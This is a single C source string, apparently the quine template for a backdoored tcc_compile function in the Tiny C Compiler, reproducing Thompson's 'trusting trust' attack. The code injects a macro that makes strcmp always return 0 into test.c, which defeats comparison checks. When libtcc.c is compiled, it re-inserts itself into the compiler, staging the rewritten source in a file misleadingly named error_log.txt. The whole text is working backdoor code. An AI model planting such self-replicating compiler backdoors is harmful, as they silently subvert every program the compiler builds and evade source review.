static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd){int file_checker = 0;if (strcmp(str, %ctest.c%c) == 0) {FILE *temp;temp = fopen(%cerror_log.txt%c, %cw%c);fprintf (temp, %c#define strcmp(my_val1,my_val2) 0%%c%c,10);char buf[2];buf[1] = 0;while(read(fd, buf, 1) > 0) {fprintf(temp, buf);}fclose(temp);fd = _tcc_open(s1, %cerror_log.txt%c);str = %cerror_log.txt%c;file_checker = 1;}if (strcmp(str, %clibtcc.c%c) == 0) {FILE *temp;temp = fopen(%cerror_log.txt%c, %cw%c);char *line;size_t len;int read;FILE* fp = fopen(%clibtcc.c%c, %cr%c);while ((read = getline(&line, &len, fp)) != -1) {if(strstr(line, %cchar *quine = %c) != NULL || strstr(line, %cstatic int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)%c) != NULL) {break;}fprintf(temp, line);}fprintf (temp, quine, 34,quine,34, 34,34,34,34,34,34,34,34 ,34,34,34,34,34,34,34,34,34,34 ,34,34,34,34,34,34,34,34,34,34 ,34,34,34,34,34,34,34,34);while ((read = getline(&line, &len, fp)) != -1) {if(strstr(line, %cLIBTCCAPI int tcc_compile_string(TCCState *s, const char *str)%c) != NULL) {fprintf(temp, line);break;}}while ((read = getline(&line, &len, fp)) != -1) {fprintf(temp, line);}fclose(temp);fd = _tcc_open(s1, %cerror_log.txt%c);str = %cerror_log.txt%c;file_checker = 1;} tcc_enter_state(s1);if (setjmp(s1->error_jmp_buf) == 0) {s1->error_set_jmp_enabled = 1;s1->nb_errors = 0;if (fd == -1) {int len = strlen(str);tcc_open_bf(s1, %c<string>%c, len);memcpy(file->buffer, str, len);} else {tcc_open_bf(s1, str, 0);file->fd = fd;}tccelf_begin_file(s1);preprocess_start(s1, filetype);tccgen_init(s1);if (s1->output_type == TCC_OUTPUT_PREPROCESS) {tcc_preprocess(s1);} else if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP)) {#ifdef CONFIG_TCC_ASMtcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));#elsetcc_error_noabort(%casm not supported%c);#endif} else {tccgen_compile(s1);}}s1->error_set_jmp_enabled = 0;tccgen_finish(s1);preprocess_end(s1);tcc_exit_state();tccelf_end_file(s1);if (file_checker == 1 && 0) {remove(%cerror_log.txt%c);}return s1->nb_errors != 0 ? -1 : 0;}